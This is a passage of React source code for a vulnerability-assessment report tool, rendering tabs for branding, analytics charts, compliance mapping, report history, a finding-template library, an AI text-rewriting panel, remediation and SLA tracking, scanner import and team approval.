      <div className="grid grid-cols-2 gap-4 mb-4">
        <div><label className={L}>Footer Text</label><input className={I} value={data.footerText||""} onChange={e=>upd("footerText",e.target.value)}/></div>
        <div><label className={L}>Watermark</label><input className={I} placeholder="DRAFT / CONFIDENTIAL..." value={data.watermark||""} onChange={e=>upd("watermark",e.target.value)}/></div>
      </div>
      <div className="mb-5"><label className={L}>Company Logo</label>
        <div className="flex items-center gap-3">
          <label className="cursor-pointer bg-gray-800 hover:bg-gray-700 text-gray-300 text-xs px-3 py-2 rounded font-semibold">
            Upload Logo <input type="file" accept="image/*" className="hidden" onChange={e=>{ const f=e.target.files[0]; if(!f)return; const r=new FileReader(); r.onload=ev=>upd("logo",ev.target.result); r.readAsDataURL(f); }}/>
          </label>
          {data.logo && (<><img src={data.logo} alt="logo" className="h-10 max-w-24 object-contain rounded border border-gray-600"/><button onClick={()=>upd("logo","")} className="text-red-500 text-xs">Remove</button></>)}
        </div>
      </div>
      {/* Live preview */}
      <div className="border border-gray-700 rounded-lg overflow-hidden">
        <div className="text-xs text-gray-500 px-3 py-2 bg-gray-800 font-semibold">LIVE PREVIEW</div>
        <div className="p-5 rounded-b" style={{background:data.useCustom?data.customBg||th.bg:th.bg}}>
          <div className="h-1 mb-4 rounded" style={{background:data.useCustom?data.customAccent||th.accent:th.accent}}/>
          {data.logo && <img src={data.logo} alt="logo" className="h-8 mb-2 object-contain"/>}
          <div className="font-black text-lg tracking-widest uppercase mb-1" style={{color:data.useCustom?data.customText||th.text:th.text}}>VAPT REPORT</div>
          <div className="text-xs font-semibold mb-3" style={{color:data.useCustom?data.customAccent||th.accent:th.accent}}>{data.cover.org||"Organisation"} • {data.cover.classification||"CONFIDENTIAL"}</div>
          <div className="flex gap-2">
            {[["C",sevCount.Critical,"#FF1744","#33000A"],["H",sevCount.High,"#FF6D00","#331500"],["M",sevCount.Medium,"#FFD600","#2A2500"],["L",sevCount.Low,"#00E676","#00220F"]].map(([s,c,col,bg])=>(
              <div key={s} className="text-center px-3 py-1 rounded" style={{background:bg}}>
                <div className="font-black text-base" style={{color:col}}>{c}</div>
                <div className="text-xs font-bold" style={{color:col}}>{s}</div>
              </div>
            ))}
          </div>
          {data.watermark && <div className="text-center mt-2 text-xs font-black opacity-20" style={{color:data.useCustom?data.customAccent||th.accent:th.accent}}>{data.watermark}</div>}
        </div>
      </div>
    </div>
  );

  // ── RENDER: ANALYTICS ────────────────────────────────────────────────────
  const TabAnalytics = () => {
    const pieData = [["Critical","#FF1744"],["High","#FF6D00"],["Medium","#FFD600"],["Low","#00E676"],["Info","#40C4FF"]].filter(([s])=>sevCount[s]>0).map(([s,c])=>({name:s,value:sevCount[s],color:c}));
    const barData = data.findings.map(f=>({name:(f.title||"").slice(0,18)+"…",cvss:parseFloat(f.cvssScore)||0,fill:SEV_COLOR[f.severity]||"#8892A4"}));
    const maxCVSS = data.findings.length ? Math.max(...data.findings.map(f=>parseFloat(f.cvssScore)||0)) : 0;
    const avgCVSS = data.findings.length ? (data.findings.reduce((a,f)=>a+(parseFloat(f.cvssScore)||0),0)/data.findings.length).toFixed(1) : "0.0";
    return (
      <div>
        <h2 className="text-lg font-bold text-cyan-400 mb-5">📊 Analytics Dashboard</h2>
        <div className="grid grid-cols-5 gap-3 mb-6">
          {[["Total",data.findings.length,"text-cyan-400"],["Critical",sevCount.Critical,"text-red-500"],["High",sevCount.High,"text-orange-500"],["Max CVSS",maxCVSS.toFixed(1),"text-yellow-400"],["Avg CVSS",avgCVSS,"text-green-400"]].map(([lbl,val,cls])=>(
            <div key={lbl} className="bg-gray-900 border border-gray-800 rounded-lg p-4 text-center">
              <div className={"text-2xl font-black "+cls}>{val}</div>
              <div className="text-xs text-gray-500 mt-1">{lbl}</div>
            </div>
          ))}
        </div>
        {data.findings.length===0 ? <div className="text-center text-gray-600 py-10">Add findings to see analytics.</div> : (
          <div className="grid grid-cols-2 gap-4">
            <div className="bg-gray-900 border border-gray-800 rounded-lg p-4">
              <div className="text-sm font-bold text-gray-300 mb-3">Severity Distribution</div>
              <ResponsiveContainer width="100%" height={200}>
                <PieChart><Pie data={pieData} cx="50%" cy="50%" outerRadius={80} dataKey="value" label={({name,value})=>name+" ("+value+")"} style={{fontSize:"9px"}}>
                  {pieData.map((e,i)=><Cell key={i} fill={e.color}/>)}
                </Pie><Tooltip contentStyle={{background:"#0F1628",border:"1px solid #1E2A3A",borderRadius:"6px",fontSize:"11px"}}/></PieChart>
              </ResponsiveContainer>
            </div>
            <div className="bg-gray-900 border border-gray-800 rounded-lg p-4">
              <div className="text-sm font-bold text-gray-300 mb-3">CVSS Scores</div>
              <ResponsiveContainer width="100%" height={200}>
                <BarChart data={barData} layout="vertical" margin={{left:4,right:16}}>
                  <XAxis type="number" domain={[0,10]} tick={{fill:"#8892A4",fontSize:9}}/>
                  <YAxis type="category" dataKey="name" tick={{fill:"#8892A4",fontSize:8}} width={80}/>
                  <Tooltip formatter={v=>[v.toFixed(1),"CVSS"]} contentStyle={{background:"#0F1628",border:"1px solid #1E2A3A",borderRadius:"6px",fontSize:"11px"}}/>
                  <Bar dataKey="cvss" radius={[0,3,3,0]}>{barData.map((e,i)=><Cell key={i} fill={e.fill}/>)}</Bar>
                </BarChart>
              </ResponsiveContainer>
            </div>
          </div>
        )}
      </div>
    );
  };

  // ── RENDER: COMPLIANCE ───────────────────────────────────────────────────
  const TabCompliance = () => {
    const mapped = data.findings.filter(f=>f.owasp&&COMPLIANCE[f.owasp]);
    return (
      <div>
        <h2 className="text-lg font-bold text-cyan-400 mb-2">📜 Compliance Mapping</h2>
        <p className="text-xs text-gray-500 mb-4">Auto-mapped from OWASP categories — incl. RBI CSF, CERT-In, SEBI CSCRF, IRDAI.</p>
        {mapped.length===0 ? (
          <div className="text-center text-gray-600 py-10 border-2 border-dashed border-gray-800 rounded-lg"><div className="text-4xl mb-2">📋</div><div>Assign OWASP categories to findings to see mappings.</div></div>
        ) : (
          <div className="overflow-x-auto rounded-lg border border-gray-800">
            <table className="w-full text-xs">
              <thead><tr className="bg-gray-800 text-cyan-400">{["Finding","Sev","OWASP","PCI","ISO","NIST","CIS","RBI CSF","CERT-In","SEBI CSCRF","IRDAI"].map(h=><th key={h} className="p-2 text-left font-semibold">{h}</th>)}</tr></thead>
              <tbody>{mapped.map((f,i)=>{ const c=COMPLIANCE[f.owasp]; const sclr=SEV_COLOR[f.severity]||"#8892A4";
                return <tr key={f._id} className={i%2===0?"bg-gray-900":"bg-gray-950"}>
                  <td className="p-2 text-gray-200">{(f.title||"").slice(0,24)}</td>
                  <td className="p-2 font-bold text-xs" style={{color:sclr}}>{f.severity}</td>
                  <td className="p-2 text-cyan-400 font-mono font-bold">{f.owasp}</td>
                  <td className="p-2 text-yellow-400 font-mono">{c.pci}</td>
                  <td className="p-2 text-blue-400 font-mono">{c.iso}</td>
                  <td className="p-2 text-green-400 font-mono">{c.nist}</td>
                  <td className="p-2 text-purple-400 font-mono">{c.cis}</td>
                  <td className="p-2 text-orange-400 font-mono">{c.rbi}</td>
                  <td className="p-2 text-red-400 font-mono">{c.certin}</td>
                  <td className="p-2 text-pink-400 font-mono">{c.sebi}</td>
                  <td className="p-2 text-teal-400 font-mono">{c.irdai}</td>
                </tr>; })}
              </tbody>
            </table>
          </div>
        )}
        <div className="mt-6 grid grid-cols-2 gap-3">
          {[["🔒 PCI DSS 4.0","Req 6.2.4 App Security; Req 8.2.1 Authentication","border-yellow-800"],["📋 ISO 27001:2022","Annex A.14 System Dev; A.9 Access Control; A.12 Ops Security","border-blue-800"],["🏛️ NIST CSF 2.0","PR.AC Access Control; SI Integrity; AU Accountability","border-green-800"],["⚙️ CIS Controls v8","CIS-5 Account Mgmt; CIS-6 Access Control; CIS-16 App Security","border-purple-800"],["🇮🇳 RBI Cyber Security Framework","Annex 7/9/11/12/13/14/15 — Config, Access, Patch, Crypto, Network, SDLC, Logging","border-orange-800"],["🛡️ CERT-In Guidelines","VAPT, hardening, SDLC, patch & incident reporting advisories","border-red-800"],["📈 SEBI CSCRF","Cyber Security & Cyber Resilience Framework for regulated entities","border-pink-800"],["⚕️ IRDAI Cyber Guidelines","G3–G9 — Insurance sector information & cyber security guidelines","border-teal-800"]].map(([t,d_,b])=>(
            <div key={t} className={"bg-gray-900 rounded-lg p-3 border "+b}><div className="text-sm font-bold text-gray-200 mb-1">{t}</div><div className="text-xs text-gray-500">{d_}</div></div>
          ))}
        </div>
      </div>
    );
  };

  // ── RENDER: HISTORY ──────────────────────────────────────────────────────
  const downloadHistoryReport = async id => {
    const r = await store.get("vapt-report-"+id);
    if(!r){ notify("Full data not saved for this report","error"); return; }
    try { const d = JSON.parse(r.value); setData(d); await new Promise(res=>setTimeout(res,150)); exportPDF(); }
    catch { notify("Failed to load report data","error"); }
  };

  const TabHistory = () => {
    const isSuper = authUser.role==="superuser";
    const visible = isSuper ? history : history.filter(h=>!h.createdBy || h.createdBy===authUser.username);
    return (
    <div>
      <div className="flex items-center justify-between mb-4">
        <h2 className="text-lg font-bold text-cyan-400">📂 {isSuper?"All Reports (Super Admin)":"My Reports"} <span className="text-gray-500 text-base">({visible.length} saved)</span></h2>
        {authUser.role!=="user" && <button className="bg-red-900 hover:bg-red-800 text-red-300 text-xs px-3 py-1.5 rounded" onClick={async()=>{ setHistory([]); await store.set("vapt-history","[]"); notify("History cleared","info"); }}>Clear All</button>}
      </div>
      {visible.length===0 && <div className="text-center text-gray-600 py-16 border-2 border-dashed border-gray-800 rounded-lg"><div className="text-5xl mb-3">📭</div><div className="font-semibold">No previous reports</div><div className="text-sm mt-1">Use "💾 Save" to store reports here</div></div>}
      {visible.map(h=>(
        <div key={h.id} className="bg-gray-900 border border-gray-800 rounded-lg p-4 mb-3 flex items-center gap-4">
          <div className="flex-1 min-w-0">
            <div className="flex items-center gap-2">
              <div className="text-white font-semibold truncate">{h.org||"Unnamed Report"}</div>
              {isSuper && h.createdBy && <span className="text-xs px-2 py-0.5 rounded-full font-bold bg-indigo-900 text-indigo-300 shrink-0">👤 {h.createdBy}</span>}
            </div>
            <div className="text-xs text-gray-500 mt-1">{h.date} • {THEME_NAMES[h.themeId]||h.themeId} • {h.total} findings</div>
            <div className="flex gap-2 mt-1.5 flex-wrap">
              {[["C",h.Critical,"#FF1744"],["H",h.High,"#FF6D00"],["M",h.Medium,"#FFD600"],["L",h.Low,"#00E676"]].map(([s,c,col])=>c>0&&(
                <span key={s} className="text-xs px-1.5 py-0.5 rounded font-bold" style={{color:col,background:col+"22"}}>{s}: {c}</span>
              ))}
            </div>
          </div>
          <div className="flex gap-2 shrink-0">
            {authUser.role==="user" ? (
              <button onClick={()=>downloadHistoryReport(h.id)} className="bg-cyan-800 hover:bg-cyan-700 text-cyan-300 text-xs px-3 py-1.5 rounded font-semibold">⬇ View &amp; Download</button>
            ) : (
              <>
                <button onClick={()=>loadReport(h.id)} className="bg-cyan-800 hover:bg-cyan-700 text-cyan-300 text-xs px-3 py-1.5 rounded font-semibold">Load</button>
                <button onClick={()=>delHistory(h.id)} className="bg-red-900 hover:bg-red-800 text-red-300 text-xs px-2 py-1.5 rounded font-semibold">×</button>
              </>
            )}
          </div>
        </div>
      ))}
    </div>
    );
  };

  // ── LIBRARY MODAL ────────────────────────────────────────────────────────
  const LibModal = () => {
    const cats = [...new Set(LIBRARY.map(t=>t.cat))];
    const list = LIBRARY.filter(t=>t.title.toLowerCase().includes(libModal.search.toLowerCase())||t.cat.toLowerCase().includes(libModal.search.toLowerCase()));
    return (
      <div className="fixed inset-0 bg-black/80 z-50 flex items-center justify-center p-4" onClick={()=>setLibModal({open:false,search:""})}>
        <div className="bg-gray-900 border border-gray-700 rounded-xl w-full max-w-3xl max-h-[80vh] flex flex-col" onClick={e=>e.stopPropagation()}>
          <div className="flex items-center justify-between p-4 border-b border-gray-800">
            <div><h3 className="font-bold text-white">📚 Finding Library</h3><div className="text-xs text-gray-500 mt-0.5">12 ready-to-use vulnerability templates</div></div>
            <button onClick={()=>setLibModal({open:false,search:""})} className="text-gray-500 hover:text-gray-300 text-xl font-bold">×</button>
          </div>
          <div className="p-3 border-b border-gray-800">
            <input className="w-full bg-gray-800 border border-gray-700 text-gray-200 rounded px-3 py-2 text-sm focus:outline-none focus:border-cyan-500" placeholder="Search templates..." value={libModal.search} onChange={e=>setLibModal(l=>({...l,search:e.target.value}))}/>
          </div>
          <div className="overflow-y-auto flex-1 p-3">
            <div className="flex flex-wrap gap-1 mb-3">
              {cats.map(c=><button key={c} className="text-xs bg-gray-800 hover:bg-gray-700 text-gray-400 px-2 py-0.5 rounded" onClick={()=>setLibModal(l=>({...l,search:c}))}>{c}</button>)}
              <button className="text-xs bg-gray-800 hover:bg-gray-700 text-cyan-400 px-2 py-0.5 rounded" onClick={()=>setLibModal(l=>({...l,search:""}))}>All</button>
            </div>
            <div className="grid grid-cols-2 gap-2">
              {list.map((tpl,i)=>(
                <div key={i} className="bg-gray-800 hover:bg-gray-750 border border-gray-700 hover:border-gray-500 rounded-lg p-3 cursor-pointer transition-colors group" onClick={()=>insertLib(tpl)}>
                  <div className="flex items-center justify-between mb-1">
                    <span className="text-white text-sm font-semibold group-hover:text-cyan-300 transition-colors">{tpl.title}</span>
                    <span className="text-xs font-bold px-1.5 py-0.5 rounded" style={{color:SEV_COLOR[fromCVSS(tpl.cvssScore)],background:SEV_COLOR[fromCVSS(tpl.cvssScore)]+"22"}}>{tpl.cvssScore}</span>
                  </div>
                  <div className="flex gap-2 text-xs"><span className="text-gray-500">{tpl.cat}</span>{tpl.owasp&&<span className="text-cyan-600">{tpl.owasp}</span>}{tpl.cwe&&<span className="text-purple-600">{tpl.cwe}</span>}</div>
                  <div className="text-xs text-cyan-500 mt-1.5 opacity-0 group-hover:opacity-100 transition-opacity font-semibold">Click to insert →</div>
                </div>
              ))}
            </div>
          </div>
        </div>
      </div>
    );
  };

  // ── AI PANEL MODAL ───────────────────────────────────────────────────────
  const CHIPS = ["Make it shorter","More formal","Add technical depth","Simplify for management","Add compliance refs","More detailed","Fix grammar","Use bullet points","Add CVSS context","2 sentences max"];
  const AIPanel = () => (
    <div className="fixed inset-0 bg-black/80 z-50 flex items-center justify-center p-4" onClick={()=>setAiPanel(p=>({...p,open:false}))}>
      <div className="bg-gray-900 border border-purple-800 rounded-xl w-full max-w-2xl max-h-[92vh] flex flex-col" onClick={e=>e.stopPropagation()}>
        <div className="flex items-center justify-between p-4 border-b border-gray-800 shrink-0">
          <div><h3 className="font-bold text-white flex items-center gap-2">✨ AI Writing Assistant</h3>
          <div className="text-xs text-gray-500 mt-0.5 capitalize">Field: <span className="text-purple-400 font-semibold">{aiPanel.field}</span>{aiPanel.idx!==null&&<span className="ml-2 text-gray-600">Finding #{aiPanel.idx+1}</span>}</div></div>
          <button onClick={()=>setAiPanel(p=>({...p,open:false}))} className="text-gray-500 hover:text-gray-300 text-2xl font-bold w-8 h-8 flex items-center justify-center rounded hover:bg-gray-800">×</button>
        </div>
        <div className="overflow-y-auto flex-1 p-4 space-y-4">
          {["description","impact","remediation"].includes(aiPanel.field) && (
            <div>
              <div className="text-xs text-gray-400 font-semibold mb-2 uppercase tracking-wider">Writing Mode</div>
              <div className="grid grid-cols-3 gap-2">
                {[["technical","🔧 Technical","For security engineers"],["management","👔 Management","For C-suite"],["compliance","📋 Compliance","For auditors"]].map(([m,l,d])=>(
                  <button key={m} onClick={()=>setAiPanel(p=>({...p,mode:m}))} className={"p-2.5 rounded-lg border text-xs font-semibold transition-all text-left "+(aiPanel.mode===m?"border-purple-500 bg-purple-900/40 text-purple-300":"border-gray-700 text-gray-400 hover:border-gray-500")}>
                    <div>{l}</div><div className="text-xs opacity-60 mt-0.5 font-normal">{d}</div>
                  </button>
                ))}
              </div>
            </div>
          )}
          <button onClick={runAI} disabled={aiPanel.loading||aiPanel.enhancing} className="w-full bg-gradient-to-r from-purple-700 to-indigo-700 hover:from-purple-600 hover:to-indigo-600 disabled:opacity-40 text-white font-bold py-3 rounded-xl flex items-center justify-center gap-2 text-sm">
            {aiPanel.loading ? <><span className="animate-spin text-lg">⟳</span> Generating...</> : <><span>✨</span> Generate with AI</>}
          </button>
          {aiPanel.result && (
            <div>
              <div className="flex items-center justify-between mb-1.5">
                <div className="text-xs text-gray-400 font-semibold uppercase tracking-wider">AI Output</div>
                <div className="flex gap-2">
                  {aiPanel.history.length>0 && <button onClick={()=>setAiPanel(p=>{ const [prev,...rest]=p.history; return {...p,result:prev,history:rest}; })} className="text-xs bg-gray-700 hover:bg-gray-600 text-gray-300 px-2 py-1 rounded font-semibold">↩ Undo</button>}
                  <button onClick={()=>{ navigator.clipboard.writeText(aiPanel.result); notify("Copied!","info"); }} className="text-xs bg-gray-700 hover:bg-gray-600 text-gray-300 px-2 py-1 rounded font-semibold">📋 Copy</button>
                </div>
              </div>
              <div className="bg-gray-800 border border-purple-900/50 rounded-xl p-4 text-sm text-gray-200 leading-relaxed whitespace-pre-wrap max-h-40 overflow-y-auto">{aiPanel.result}</div>
              {/* Enhance / Refine */}
              <div className="mt-4 border border-cyan-900/50 rounded-xl overflow-hidden">
                <div className="bg-cyan-950/40 px-4 py-2.5 border-b border-cyan-900/30 flex items-center gap-2">
                  <span className="text-cyan-400 text-base">✏️</span>
                  <span className="text-cyan-300 font-semibold text-sm">Enhance / Refine Output</span>
                  <span className="text-gray-600 text-xs ml-1">— Tell AI how to improve it</span>
                </div>
                <div className="p-3 bg-gray-950/50">
                  <div className="flex flex-wrap gap-1.5 mb-3">
                    {CHIPS.map(c=>(
                      <button key={c} onClick={()=>setAiPanel(p=>({...p,enhance:c}))} className={"text-xs px-2.5 py-1 rounded-full border transition-all font-medium "+(aiPanel.enhance===c?"bg-cyan-800 border-cyan-500 text-cyan-200":"bg-gray-800 border-gray-700 text-gray-400 hover:border-gray-500 hover:text-gray-200")}>{c}</button>
                    ))}
                  </div>
                  <div className="flex gap-2">
                    <input className="flex-1 bg-gray-800 border border-gray-700 text-gray-100 rounded-lg px-3 py-2 text-sm focus:outline-none focus:border-cyan-500 placeholder-gray-600"
                      placeholder='e.g. "Make shorter", "Add CVE references", "More technical"...'
                      value={aiPanel.enhance}
                      onChange={e=>setAiPanel(p=>({...p,enhance:e.target.value}))}
                      onKeyDown={e=>{ if(e.key==="Enter"&&!e.shiftKey){ e.preventDefault(); runEnhance(); }}}
                    />
                    <button onClick={runEnhance} disabled={!aiPanel.enhance.trim()||aiPanel.enhancing||aiPanel.loading} className="shrink-0 bg-cyan-700 hover:bg-cyan-600 disabled:opacity-40 text-white font-bold px-4 py-2 rounded-lg text-sm flex items-center gap-1">
                      {aiPanel.enhancing ? <><span className="animate-spin">⟳</span> Refining...</> : <>✨ Refine</>}
                    </button>
                  </div>
                  <div className="text-xs text-gray-600 mt-1.5">Press Enter or click Refine</div>
                </div>
              </div>
              <button onClick={applyAI} className="w-full mt-3 bg-green-700 hover:bg-green-600 text-white font-bold py-2.5 rounded-xl text-sm flex items-center justify-center gap-2">✓ Apply to Report</button>
            </div>
          )}
        </div>
      </div>
    </div>
  );

  // ── SIDEBAR TABS ─────────────────────────────────────────────────────────
  // ── RENDER: TRACKER DASHBOARD (Priority 1) ───────────────────────────────
  const TabTracker = () => {
    const total=data.findings.length;
    const closed=data.findings.filter(f=>f.status==="Closed").length;
    const open=total-closed;
    const progress = total ? Math.round((closed/total)*100) : 0;
    const risk = riskScore(data.findings);
    const statusCount = STATUS_FLOW.reduce((a,s)=>{ a[s]=data.findings.filter(f=>f.status===s).length; return a; },{});
    const trendData = STATUS_FLOW.map(s=>({name:s,count:statusCount[s]||0,fill:STATUS_COLOR[s]}));
    return (
      <div>
        <style>{"@keyframes cardIn{from{opacity:0;transform:translateY(12px) scale(.97)}to{opacity:1;transform:translateY(0) scale(1)}}@keyframes barGrow{from{width:0}}"}</style>
        <h2 className="text-lg font-bold text-cyan-400 mb-5">📊 VAPT Tracker Dashboard</h2>
        <div className="grid grid-cols-4 gap-3 mb-6">
          {[["Total Findings",total,"text-cyan-400"],["Closed",closed,"text-green-400"],["Open",open,"text-red-400"],["Remediation Progress",progress+"%","text-yellow-400"]].map(([lbl,val,cls],i)=>(
            <div key={lbl} className="bg-gray-900 border border-gray-800 rounded-lg p-4 text-center hover:border-cyan-800 transition-colors" style={{animation:`cardIn 0.4s ease-out ${i*0.08}s both`}}>
              <div className={"text-3xl font-black "+cls}>{val}</div><div className="text-xs text-gray-500 mt-1">{lbl}</div>
            </div>
          ))}
        </div>
        <div className="bg-gray-900 border border-gray-800 rounded-lg p-4 mb-6" style={{animation:"cardIn 0.4s ease-out 0.32s both"}}>
          <div className="flex items-center justify-between mb-2">
            <span className="text-sm font-bold text-gray-300">Overall Risk Score</span>
            <span className="text-2xl font-black" style={{color:risk>=70?"#FF1744":risk>=40?"#FF6D00":"#00E676"}}>{risk}/100</span>
          </div>
          <div className="w-full h-3 bg-gray-800 rounded-full overflow-hidden">
            <div className="h-full rounded-full" style={{width:risk+"%",background:risk>=70?"#FF1744":risk>=40?"#FF6D00":"#00E676",animation:"barGrow 0.8s ease-out 0.3s"}}/>
          </div>
        </div>
        <div className="bg-gray-900 border border-gray-800 rounded-lg p-4" style={{animation:"cardIn 0.4s ease-out 0.4s both"}}>
          <div className="text-sm font-bold text-gray-300 mb-3">Findings by Status (Retest Pipeline)</div>
          <ResponsiveContainer width="100%" height={200}>
            <BarChart data={trendData}>
              <CartesianGrid strokeDasharray="3 3" stroke="#1E2A3A"/>
              <XAxis dataKey="name" tick={{fill:"#8892A4",fontSize:10}}/>
              <YAxis tick={{fill:"#8892A4",fontSize:10}}/>
              <Tooltip contentStyle={{background:"#0F1628",border:"1px solid #1E2A3A",borderRadius:"6px"}}/>
              <Bar dataKey="count" radius={[4,4,0,0]}>{trendData.map((e,i)=><Cell key={i} fill={e.fill}/>)}</Bar>
            </BarChart>
          </ResponsiveContainer>
        </div>
        <div className="mt-6 overflow-x-auto rounded-lg border border-gray-800">
          <table className="w-full text-xs">
            <thead><tr className="bg-gray-800 text-cyan-400">{["ID","Title","Severity","Status","Quick Action"].map(h=><th key={h} className="p-2 text-left">{h}</th>)}</tr></thead>
            <tbody>
              {data.findings.length===0 && <tr><td colSpan={5} className="p-4 text-center text-gray-600">No findings yet.</td></tr>}
              {data.findings.map((f,i)=>(
                <tr key={f._id} className={i%2===0?"bg-gray-900":"bg-gray-950"}>
                  <td className="p-2 font-mono text-cyan-400">{f.id}</td>
                  <td className="p-2 text-gray-200">{f.title||"(Untitled)"}</td>
                  <td className="p-2 font-bold" style={{color:SEV_COLOR[f.severity]}}>{f.severity}</td>
                  <td className="p-2 font-bold" style={{color:STATUS_COLOR[f.status]||"#8892A4"}}>{f.status}</td>
                  <td className="p-2">{f.status!=="Closed" && <button onClick={()=>setFStatus(i,nextStatus(f.status))} className="text-xs bg-cyan-800 hover:bg-cyan-700 text-cyan-200 px-2 py-1 rounded font-semibold">→ {nextStatus(f.status)}</button>}</td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      </div>
    );
  };

  // ── RENDER: SLA TRACKING DASHBOARD ───────────────────────────────────────
  const TabSLA = () => {
    const rows = data.findings.filter(f=>f.status!=="Closed").map(f=>({f,sla:slaInfo(f)})).sort((a,b)=>(a.sla.remaining??999)-(b.sla.remaining??999));
    const overdueCount = rows.filter(r=>r.sla.overdue>0).length;
    const amberCount   = rows.filter(r=>r.sla.overdue===0 && r.sla.color==="#FF6D00").length;
    const greenCount   = rows.filter(r=>r.sla.color==="#00E676").length;
    return (
      <div>
        <h2 className="text-lg font-bold text-cyan-400 mb-2">⏱ SLA Tracking Dashboard</h2>
        <p className="text-xs text-gray-500 mb-4">Critical: 7d • High: 30d • Medium: 60d • Low: 90d — counted from each finding's Opened Date.</p>
        <div className="grid grid-cols-3 gap-3 mb-6">
          <div className="bg-gray-900 border border-red-900 rounded-lg p-4 text-center"><div className="text-3xl font-black text-red-500">{overdueCount}</div><div className="text-xs text-gray-500 mt-1">🔴 Overdue</div></div>
          <div className="bg-gray-900 border border-orange-900 rounded-lg p-4 text-center"><div className="text-3xl font-black text-orange-500">{amberCount}</div><div className="text-xs text-gray-500 mt-1">🟠 Due Soon (Amber)</div></div>
          <div className="bg-gray-900 border border-green-900 rounded-lg p-4 text-center"><div className="text-3xl font-black text-green-500">{greenCount}</div><div className="text-xs text-gray-500 mt-1">🟢 On Track</div></div>
        </div>
        <div className="overflow-x-auto rounded-lg border border-gray-800">
          <table className="w-full text-xs">
            <thead><tr className="bg-gray-800 text-cyan-400">{["ID","Title","Severity","SLA","Opened","Due Date","Status"].map(h=><th key={h} className="p-2 text-left font-semibold">{h}</th>)}</tr></thead>
            <tbody>
              {rows.length===0 && <tr><td colSpan={7} className="p-4 text-center text-gray-600">No open findings — nothing to track.</td></tr>}
              {rows.map(({f,sla},i)=>(
                <tr key={f._id} className={i%2===0?"bg-gray-900":"bg-gray-950"}>
                  <td className="p-2 font-mono text-cyan-400">{f.id}</td>
                  <td className="p-2 text-gray-200">{f.title||"(Untitled)"}</td>
                  <td className="p-2 font-bold" style={{color:SEV_COLOR[f.severity]}}>{f.severity}</td>
                  <td className="p-2 text-gray-400">{sla.days}d</td>
                  <td className="p-2 text-gray-400">{f.openedDate||"—"}</td>
                  <td className="p-2 text-gray-400">{sla.due?sla.due.toISOString().slice(0,10):"—"}</td>
                  <td className="p-2">
                    <span className="font-bold px-2 py-0.5 rounded-full text-xs" style={{color:sla.color,background:sla.color+"22"}}>
                      {sla.overdue>0 ? `${sla.overdue}d OVERDUE` : sla.remaining!=null ? `${sla.remaining}d left` : "—"}
                    </span>
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      </div>
    );
  };

  // ── RENDER: SCANNER IMPORT (Priority 1: CSV/XLSX bulk upload) ────────────
  const TabImport = () => {
    const onDrop = e => { e.preventDefault(); setDragOver(false); const f=e.dataTransfer.files[0]; if(f) importScannerFile(f); };
    return (
      <div>
        <h2 className="text-lg font-bold text-cyan-400 mb-2">📥 Scanner Import</h2>
        <p className="text-xs text-gray-500 mb-4">Bulk-import findings from Nessus, Nuclei, Qualys, Burp, Acunetix, or OpenVAS CSV/XLSX exports.</p>
        <div onDrop={onDrop} onDragOver={e=>{e.preventDefault();setDragOver(true);}} onDragLeave={()=>setDragOver(false)}
          onClick={()=>document.getElementById("scan-up")?.click()}
          className={"border-2 border-dashed rounded-xl p-10 text-center cursor-pointer transition-colors "+(dragOver?"border-cyan-500 bg-cyan-950/20":"border-gray-700 hover:border-cyan-600")}>
          <div className="text-5xl mb-3">📂</div>
          <div className="text-gray-300 font-semibold">Drag &amp; Drop CSV / XLSX scanner export</div>
          <div className="text-gray-600 text-xs mt-1">or click to browse</div>
          <input id="scan-up" type="file" accept=".csv,.xlsx,.xls" className="hidden" onChange={e=>{ const f=e.target.files[0]; if(f) importScannerFile(f); e.target.value=""; }}/>
        </div>
        <div className="grid grid-cols-3 gap-2 mt-5">
          {["Nessus","Nuclei","Qualys","Burp","Acunetix","OpenVAS"].map(s=>(
            <div key={s} className="bg-gray-900 border border-gray-800 rounded-lg p-2.5 text-center text-xs text-gray-400 font-semibold">{s}</div>
          ))}
        </div>
        <div className="mt-5 text-xs text-gray-600">Recognised columns: Plugin Name / Name / Title, Risk / Severity, CVE, CVSS, Description, Solution / Remediation, Host / IP / URL.</div>
      </div>
    );
  };

  // ── RENDER: TEAM, APPROVAL WORKFLOW, AUDIT TRAIL, VERSIONING (Priority 3) ─
  const TabTeam = () => (
    <div>
      <h2 className="text-lg font-bold text-cyan-400 mb-5">👥 Team, Approval &amp; Audit Trail</h2>

      {/* Users / Roles */}
      <div className="mb-6">
        <div className="flex items-center justify-between mb-2">
          <div className="text-sm font-bold text-gray-300">Team Members</div>
          <button onClick={()=>upd("users",[...data.users,{_id:uid(),name:"",role:"Pentester"}])} className="text-xs bg-cyan-700 hover:bg-cyan-600 text-white px-2 py-1 rounded font-semibold">+ Add User</button>
        </div>
        {data.users.map((u,i)=>(
          <div key={u._id} className="flex items-center gap-2 bg-gray-900 border border-gray-800 rounded-lg p-2 mb-1.5">
            <input className={I+" flex-1"} placeholder="Name" value={u.name} onChange={e=>{ const us=[...data.users]; us[i]={...us[i],name:e.target.value}; upd("users",us); }}/>
            <select className={S+" w-40"} value={u.role} onChange={e=>{ const us=[...data.users]; us[i]={...us[i],role:e.target.value}; upd("users",us); }}>
              {ROLES.map(r=><option key={r}>{r}</option>)}
            </select>
            <button onClick={()=>upd("currentUser",i)} className={"text-xs px-2 py-1.5 rounded font-semibold "+(data.currentUser===i?"bg-green-800 text-green-200":"bg-gray-800 text-gray-400")}>{data.currentUser===i?"Active":"Set Active"}</button>
            <button onClick={()=>upd("users",data.users.filter((_,j)=>j!==i))} className="text-red-500 hover:text-red-400 font-bold px-1">×</button>
          </div>
        ))}
      </div>

      {/* Approval Workflow */}
      <div className="mb-6">
        <div className="text-sm font-bold text-gray-300 mb-2">Approval Workflow</div>
        <div className="flex items-center gap-1 bg-gray-900 border border-gray-800 rounded-lg p-3">
          {APPROVAL_FLOW.map((s,i)=>(
            <div key={s} className="flex items-center flex-1">
              <div className={"flex-1 text-center text-xs font-bold py-2 rounded "+(data.approvalStage===s?"bg-cyan-800 text-cyan-100":"bg-gray-800 text-gray-500")}>{s}</div>
              {i<APPROVAL_FLOW.length-1 && <span className="text-gray-700 mx-1">→</span>}
            </div>
          ))}
        </div>
        {data.approvalStage!=="Released" && <button onClick={advanceApproval} className="mt-2 text-xs bg-green-700 hover:bg-green-600 text-white px-3 py-1.5 rounded font-semibold">Advance to {APPROVAL_FLOW[APPROVAL_FLOW.indexOf(data.approvalStage)+1]} ▶</button>}
      </div>

      {/* Versioning */}
